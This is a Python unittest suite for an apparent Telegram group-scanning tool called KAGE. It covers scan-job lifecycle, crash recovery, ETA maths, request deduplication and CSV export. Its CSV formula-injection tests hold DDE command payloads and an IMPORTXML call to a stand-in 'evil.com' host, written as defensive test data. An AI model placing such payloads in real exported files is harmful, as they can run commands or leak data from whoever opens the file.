"""
KAGE // FUNCTIONALITY AUDIT & REPAIR VERIFICATION SUITE
Automated Verification of Scan Jobs Lifecycle, Stalled Job Recovery,
Real ETA Calculation, CSV Formula Injection Defense, and Real Broadcast Tracking.
"""

import unittest
import asyncio
import tempfile
import os
import json
import csv
import io
from pathlib import Path
from unittest.mock import MagicMock, AsyncMock

from core.db import DatabaseManager
from core.engine import SuperBanEngine
from core.forensics import ForensicInspector
from core.config import Config
from web.app import create_app, _sanitize_csv_cell

class AsgiResponse:
    def __init__(self, status: int, headers: dict, body: bytes):
        self.status = status
        self.headers = headers
        self.body = body

    def json(self):
        return json.loads(self.body.decode("utf-8"))

    @property
    def text(self):
        return self.body.decode("utf-8")

class InProcessAsgiClient:
    """Pure in-process ASGI 3.0 test client running without network sockets or httpx."""
    def __init__(self, app):
        self.app = app

    async def request(
        self,
        method: str,
        path: str,
        headers: dict = None,
        json_data: dict = None,
        body: bytes = b"",
        query_string: str = "",
        client_ip: str = "127.0.0.1"
    ) -> AsgiResponse:
        headers = headers or {}
        req_headers = {}
        for k, v in headers.items():
            req_headers[k.lower()] = v

        if json_data is not None:
            body = json.dumps(json_data).encode("utf-8")
            req_headers["content-type"] = "application/json"
            req_headers["content-length"] = str(len(body))
        elif body and "content-length" not in req_headers:
            req_headers["content-length"] = str(len(body))

        if "host" not in req_headers:
            req_headers["host"] = "testserver"

        raw_headers = [
            (k.encode("latin1"), v.encode("latin1"))
            for k, v in req_headers.items()
        ]

        if "?" in path and not query_string:
            path, query_string = path.split("?", 1)

        scope = {
            "type": "http",
            "asgi": {"version": "3.0"},
            "http_version": "1.1",
            "method": method.upper(),
            "path": path,
            "raw_path": path.encode("ascii"),
            "query_string": query_string.encode("ascii"),
            "headers": raw_headers,
            "client": (client_ip, 50000),
            "server": ("127.0.0.1", 80),
        }

        response_status = None
        response_headers = {}
        response_body = bytearray()
        body_sent = False

        async def receive():
            nonlocal body_sent
            if not body_sent:
                body_sent = True
                return {"type": "http.request", "body": body, "more_body": False}
            return {"type": "http.disconnect"}

        async def send(message):
            nonlocal response_status, response_headers, response_body
            if message["type"] == "http.response.start":
                response_status = message["status"]
                for k, v in message.get("headers", []):
                    key = k.decode("latin1").lower()
                    val = v.decode("latin1")
                    if key in response_headers:
                        response_headers[key] += f", {val}"
                    else:
                        response_headers[key] = val
            elif message["type"] == "http.response.body":
                response_body.extend(message.get("body", b""))

        await self.app(scope, receive, send)
        return AsgiResponse(response_status, response_headers, bytes(response_body))


class TestKageFunctionalityRepair(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp_dir = tempfile.TemporaryDirectory()
        cls.db_path = Path(cls.temp_dir.name) / "test_kage_repair.db"
        cls.db = DatabaseManager(cls.db_path)

        cls.mock_client = MagicMock()
        cls.mock_client.is_connected.return_value = True
        cls.mock_client.on = MagicMock(return_value=lambda f: f)
        cls.mock_client.get_dialogs = AsyncMock(return_value=[])
        cls.mock_client.get_entity = AsyncMock(return_value=None)
        cls.mock_client.send_message = AsyncMock(return_value=None)
        cls.mock_client.get_me = AsyncMock(return_value=None)
        cls.engine = SuperBanEngine(client=cls.mock_client, db=cls.db)
        cls.app = create_app(cls.engine)
        cls.client = InProcessAsgiClient(cls.app)

    @classmethod
    def tearDownClass(cls):
        cls.db.close()
        cls.temp_dir.cleanup()

    # ═══════════════════════════════════════════════════════
    #  1. PERSISTENT SCAN JOBS LIFECYCLE & STATE MACHINE
    # ═══════════════════════════════════════════════════════
    def test_01_scan_jobs_lifecycle_and_states(self):
        """Verify scan jobs progress through valid states: VALIDATING -> CONNECTING -> PROCESSING -> COMPLETED."""
        async def run_test():
            job_id = "scan_test_100k_01"
            target_id = 1234567890
            target_title = "Apex Recon Channel"

            # 1. Create Job (starts at VALIDATING)
            job = await self.db.create_scan_job(
                job_id=job_id,
                job_type="100k_reputation",
                target_id=target_id,
                target_title=target_title,
                requested_limit=100000,
                batch_size=500,
                speed_mode="turbo"
            )
            self.assertEqual(job["status"], "VALIDATING")
            self.assertEqual(job["requested_limit"], 100000)

            # 2. Update to CONNECTING
            ok = await self.db.update_scan_job_progress(job_id, status="CONNECTING")
            self.assertTrue(ok)
            fetched = await self.db.get_scan_job(job_id)
            self.assertEqual(fetched["status"], "CONNECTING")

            # 3. Update to PROCESSING with real telemetry
            ok = await self.db.update_scan_job_progress(
                job_id,
                status="PROCESSING",
                processed_count=25000,
                percent=25.0,
                speed=850.5,
                eta_seconds=88,
                unique_members=412
            )
            self.assertTrue(ok)
            fetched = await self.db.get_scan_job(job_id)
            self.assertEqual(fetched["status"], "PROCESSING")
            self.assertEqual(fetched["processed_count"], 25000)
            self.assertEqual(fetched["percent"], 25.0)
            self.assertEqual(fetched["speed"], 850.5)
            self.assertEqual(fetched["eta_seconds"], 88)
            self.assertEqual(fetched["unique_members"], 412)
            self.assertIsNotNone(fetched["heartbeat_at"])

            # 4. Check active job retrieval by target
            active = await self.db.get_active_scan_job_for_target(target_id)
            self.assertIsNotNone(active)
            self.assertEqual(active["job_id"], job_id)

            # 5. Complete Job
            ok = await self.db.update_scan_job_progress(
                job_id,
                status="COMPLETED",
                processed_count=100000,
                percent=100.0,
                unique_members=1250
            )
            self.assertTrue(ok)
            fetched = await self.db.get_scan_job(job_id)
            self.assertEqual(fetched["status"], "COMPLETED")
            self.assertIsNotNone(fetched["completed_at"])

            # 6. Target has no active job after completion
            active_after = await self.db.get_active_scan_job_for_target(target_id)
            self.assertIsNone(active_after)

            # 7. But latest job is still retrievable
            latest = await self.db.get_latest_scan_job_for_target(target_id)
            self.assertIsNotNone(latest)
            self.assertEqual(latest["job_id"], job_id)
            self.assertEqual(latest["status"], "COMPLETED")

        asyncio.run(run_test())
        print("  ✅ PASS: Scan jobs lifecycle (VALIDATING -> CONNECTING -> PROCESSING -> COMPLETED) verified.")

    # ═══════════════════════════════════════════════════════
    #  2. GRACEFUL CANCELLATION & RECORD PRESERVATION
    # ═══════════════════════════════════════════════════════
    def test_02_graceful_cancellation_and_record_preservation(self):
        """Verify cancelling an in-progress scan transitions cleanly to CANCELLED and preserves progress."""
        async def run_test():
            job_id = "scan_test_cancel_02"
            target_id = 987654321
            await self.db.create_scan_job(
                job_id=job_id,
                job_type="10k_quick",
                target_id=target_id,
                target_title="Quick Recon",
                requested_limit=10000
            )
            await self.db.update_scan_job_progress(
                job_id,
                status="PROCESSING",
                processed_count=4500,
                percent=45.0,
                unique_members=180
            )

            # User triggers abort / cancel
            cancel_ok = await self.db.cancel_scan_job(job_id, reason="Operator aborted via UI")
            self.assertTrue(cancel_ok)

            job = await self.db.get_scan_job(job_id)
            self.assertEqual(job["status"], "CANCELLED")
            self.assertEqual(job["cancellation_status"], "Operator aborted via UI")
            self.assertEqual(job["processed_count"], 4500)
            self.assertEqual(job["unique_members"], 180)
            self.assertIsNotNone(job["completed_at"])

        asyncio.run(run_test())
        print("  ✅ PASS: Graceful cancellation and record preservation verified.")

    # ═══════════════════════════════════════════════════════
    #  3. AUTOMATIC STALLED JOB RECOVERY ON CRASH / RESTART
    # ═══════════════════════════════════════════════════════
    def test_03_stalled_job_recovery_on_server_restart(self):
        """Verify jobs in PROCESSING or CONNECTING when server restarts are marked FAILED with explanation."""
        async def run_test():
            job_id_stalled = "scan_stalled_crash_03"
            await self.db.create_scan_job(
                job_id=job_id_stalled,
                job_type="100k_reputation",
                target_id=555666777,
                target_title="Stalled Target",
                requested_limit=100000
            )
            await self.db.update_scan_job_progress(
                job_id_stalled,
                status="PROCESSING",
                processed_count=12000
            )

            # Simulate server restart by creating a new DatabaseManager on the same SQLite file
            restart_db = DatabaseManager(self.db_path)
            recovered_job = await restart_db.get_scan_job(job_id_stalled)

            self.assertEqual(recovered_job["status"], "FAILED")
            self.assertIn("Server restarted during processing", recovered_job["error_info"])
            self.assertIsNotNone(recovered_job["completed_at"])
            restart_db.close()

        asyncio.run(run_test())
        print("  ✅ PASS: Stalled jobs auto-recovered to FAILED on server initialization.")

    # ═══════════════════════════════════════════════════════
    #  4. CSV FORMULA INJECTION DEFENSE (CWE-1236 / OWASP)
    # ═══════════════════════════════════════════════════════
    def test_04_csv_formula_injection_defense(self):
        """Verify malicious spreadsheet formulas (=, +, -, @, \\t, \\r) are neutralized with prepended quote."""
        malicious_payloads = [
            "=cmd|'/C calc'!A0",
            "+1234567890",
            "-2+5+cmd|' /C calc'!A0",
            "@SUM(1,1)",
            "\t=1+1",
            "\r=2+2",
            "=IMPORTXML('http://evil.com', '/')"
        ]

        for payload in malicious_payloads:
            sanitized = _sanitize_csv_cell(payload)
            self.assertTrue(
                sanitized.startswith("'"),
                f"Payload failed formula defense: {payload} -> {sanitized}"
            )

        # Benign values must remain unchanged
        benign_values = ["Regular Member", "Alice Bob", "123456789", "User#100"]
        for b in benign_values:
            self.assertEqual(_sanitize_csv_cell(b), b)

        print("  ✅ PASS: CSV formula injection defense (CWE-1236 / OWASP) verified.")

    # ═══════════════════════════════════════════════════════
    #  5. CSV EXPORT ENDPOINT INTEGRATION & HEADERS
    # ═══════════════════════════════════════════════════════
    def test_05_export_members_csv_endpoint(self):
        """Verify /api/export/members endpoint generates valid CSV with correct headers and sanitized cells."""
        async def run_test():
            gid = 888999111
            Config.save_owner_pin("1337")
            auth_res = await self.client.request(
                "POST",
                "/api/owner/verify",
                json_data={"pin": "1337"},
                headers={"x-forwarded-for": "127.0.0.1"}
            )
            self.assertEqual(auth_res.status, 200)
            auth_token = auth_res.json()["token"]

            # Seed test member with potential injection username and regular attributes
            test_members = [
                {
                    "user_id": 9901,
                    "full_name": "=cmd|'calc'!A0", # Injection attempt in name
                    "username": "safe_alice",
                    "message_count": 45,
                    "reputation_score": 85,
                    "reputation_tier": "COMMUNITY PILLAR // 柱",
                    "is_premium": True,
                    "is_verified": False,
                    "is_bot": False
                },
                {
                    "user_id": 9902,
                    "full_name": "Bob Smith",
                    "username": "@malicious_handle", # Injection attempt in handle
                    "message_count": 2,
                    "reputation_score": 30,
                    "reputation_tier": "SUSPICIOUS ACTOR // 妖",
                    "is_premium": False,
                    "is_verified": False,
                    "is_bot": False
                }
            ]
            await self.db.batch_upsert_member_reputation(gid, test_members)

            # Test HTTP CSV download via InProcessAsgiClient with auth clearance
            res = await self.client.request(
                "GET",
                f"/api/export/members?group_id={gid}&format=csv",
                headers={"x-owner-token": auth_token}
            )
            self.assertEqual(res.status, 200)
            self.assertIn("text/csv", res.headers.get("content-type", ""))
            self.assertIn("attachment; filename=", res.headers.get("content-disposition", ""))

            content = res.text
            reader = csv.reader(io.StringIO(content))
            rows = list(reader)

            # Verify header row
            self.assertGreaterEqual(len(rows), 3)
            self.assertIn("User ID", rows[0])
            self.assertIn("Reputation Score", rows[0])
            self.assertIn("Full Name", rows[0])

            # Verify first user's full name was neutralized
            row1 = rows[1]
            self.assertTrue(row1[1].startswith("'="), f"Expected '=cmd..., got: {row1[1]}")

            # Verify second user's username was neutralized
            row2 = rows[2]
            self.assertTrue(row2[2].startswith("'@"), f"Expected '@malicious..., got: {row2[2]}")

        asyncio.run(run_test())
        print("  ✅ PASS: /api/export/members generates formula-safe CSV with indexed reputation records.")

    # ═══════════════════════════════════════════════════════
    #  6. ZERO FAKE BROADCAST & REAL CAMPAIGN TRACKING
    # ═══════════════════════════════════════════════════════
    def test_06_real_broadcast_campaign_tracking_zero_fake(self):
        """Verify broadcast campaign uses database tracking, real campaign IDs, and zero Math.random simulation."""
        # Check index.html to ensure startBroadcast no longer contains Math.random() simulation
        html_path = Path(__file__).resolve().parent.parent / "web" / "static" / "index.html"
        self.assertTrue(html_path.exists())
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        # The fake broadcast simulation block must NOT exist
        self.assertNotIn(
            "Math.floor(Math.random() * 8) + 4",
            html,
            "Found fake Math.random() broadcast progress simulation in index.html!"
        )

        # Real campaign progress tracking must exist
        self.assertIn("api/broadcast/campaigns", html)
        self.assertIn("campaign_id", html)

        print("  ✅ PASS: Broadcast engine verified: zero fake progress simulation, real database tracking.")

    # ═══════════════════════════════════════════════════════
    #  7. REAL MOVING SPEED & ETA DERIVATION (NEVER FAKE)
    # ═══════════════════════════════════════════════════════
    def test_07_real_speed_and_eta_calculation(self):
        """Verify ETA calculation is strictly derived from actual processed / elapsed and never fake."""
        # Simulated scan parameters
        scanned = 25000
        target_limit = 100000
        elapsed_seconds = 50.0 # 500 msgs/sec

        speed = scanned / elapsed_seconds
        self.assertEqual(speed, 500.0)

        eta = max(0, int((target_limit - scanned) / speed)) if speed > 0 else None
        self.assertEqual(eta, 150) # 75,000 remaining / 500 = 150s

        # When speed is zero (no messages processed yet)
        speed_zero = 0.0
        eta_zero = max(0, int((target_limit - scanned) / speed_zero)) if speed_zero > 0 else None
        self.assertIsNone(eta_zero, "ETA must be None (displayed as 'ETA unavailable') when speed is zero.")

        print("  ✅ PASS: Real moving speed & ETA calculation mathematically verified.")

    # ═══════════════════════════════════════════════════════
    #  8. CONCURRENT DEEP SCAN DEDUPLICATION (ANTI-BUTTON-MASHING)
    # ═══════════════════════════════════════════════════════
    def test_08_concurrent_deep_scan_requests_deduplicated(self):
        """Verify button mashing / concurrent duplicate requests to /api/messages/deep_scan are safely deduplicated."""
        async def run_test():
            gid = 8877665544
            mock_entity = MagicMock(id=gid, title="Mash Protection Group")
            self.mock_client.get_entity = AsyncMock(return_value=mock_entity)

            Config.save_owner_pin("1337")
            auth_res = await self.client.request(
                "POST",
                "/api/owner/verify",
                json_data={"pin": "1337"},
                headers={"x-forwarded-for": "127.0.0.1"}
            )
            auth_token = auth_res.json()["token"]
            auth_headers = {"x-owner-token": auth_token}

            # Fire 5 concurrent requests representing rapid user clicks / button mashing
            tasks = [
                self.client.request(
                    "POST",
                    "/api/messages/deep_scan",
                    json_data={"group_id": gid, "limit": 100000},
                    headers=auth_headers
                )
                for _ in range(5)
            ]
            responses = await asyncio.gather(*tasks)

            # All requests should return 200 OK
            for resp in responses:
                self.assertEqual(resp.status, 200)

            results = [r.json() for r in responses]
            statuses = [r.get("status") for r in results]

            # Exactly one request starts the job, the others detect it is already running
            self.assertIn("started", statuses, "At least one request must successfully start the scan")
            self.assertIn("already_running", statuses, "Duplicate mashed taps must return 'already_running'")
            self.assertEqual(statuses.count("started"), 1, "Only exactly ONE background scan task must be started")
            self.assertEqual(statuses.count("already_running"), 4, "Remaining 4 duplicate taps must be safely suppressed")

        asyncio.run(run_test())
        print("  ✅ PASS: Deep scan button mashing deduplicated — exactly 1 task launched, 4 duplicate taps suppressed.")

    # ═══════════════════════════════════════════════════════
    #  9. CONCURRENT ROSTER SCAN DEDUPLICATION (ANTI-BUTTON-MASHING)
    # ═══════════════════════════════════════════════════════
    def test_09_concurrent_roster_scan_deduplicated(self):
        """Verify rapid clicking on /api/scan reuses in-flight task rather than spawning parallel MTProto loops."""
        async def run_test():
            gid = 3344556677
            mock_entity = MagicMock(id=gid, title="Roster Scan Group")
            self.mock_client.get_entity = AsyncMock(return_value=mock_entity)

            Config.save_owner_pin("1337")
            auth_res = await self.client.request(
                "POST",
                "/api/owner/verify",
                json_data={"pin": "1337"},
                headers={"x-forwarded-for": "127.0.0.1"}
            )
            auth_token = auth_res.json()["token"]
            auth_headers = {"x-owner-token": auth_token}

            call_count = 0
            async def slow_inspect(entity, limit=2000):
                nonlocal call_count
                call_count += 1
                await asyncio.sleep(0.05)
                return [{"id": 1, "full_name": "Test Member", "username": "test"}]

            self.engine.inspect_group_members = slow_inspect

            # Fire 4 concurrent requests simulating repeated button taps
            tasks = [
                self.client.request(
                    "POST",
                    "/api/scan",
                    json_data={"group_id": gid, "limit": 2000},
                    headers=auth_headers
                )
                for _ in range(4)
            ]
            responses = await asyncio.gather(*tasks)

            for resp in responses:
                self.assertEqual(resp.status, 200)

            # inspect_group_members must have been called only ONCE for all 4 concurrent requests!
            self.assertEqual(call_count, 1, f"Expected 1 underlying inspection call, but got {call_count}")

        asyncio.run(run_test())
        print("  ✅ PASS: Roster scan button mashing deduplicated — 4 concurrent requests shared 1 task.")

    # ═══════════════════════════════════════════════════════
    #  10. FRONTEND ANTI-BUTTON-MASHING DEFENSE SHIELD
    # ═══════════════════════════════════════════════════════
    def test_10_anti_button_mashing_frontend_shield_present(self):
        """Verify global click debouncer, capture-phase interceptor, and button busy states exist in frontend."""
        html_path = Path(__file__).resolve().parent.parent / "web" / "static" / "index.html"
        self.assertTrue(html_path.exists())
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        # Capture-phase listener and cooldown
        self.assertIn("initAntiButtonMashing", html)
        self.assertIn("CLICK_COOLDOWN_MS", html)
        self.assertIn("kage-mash-blocked", html)
        self.assertIn("btn-locked-busy", html)
        self.assertIn("setButtonBusy", html)

        # Action-specific button locks
        self.assertIn("isDeepScanStarting", html)
        self.assertIn("isReconRunning", html)
        self.assertIn("isSyncingSavedChat", html)
        self.assertIn("isRestoringSavedChat", html)
        self.assertIn("isSubmittingOwnerPin", html)

        print("  ✅ PASS: Frontend anti-button-mashing shield verified across global capture listener and button locks.")

if __name__ == "__main__":
    unittest.main()
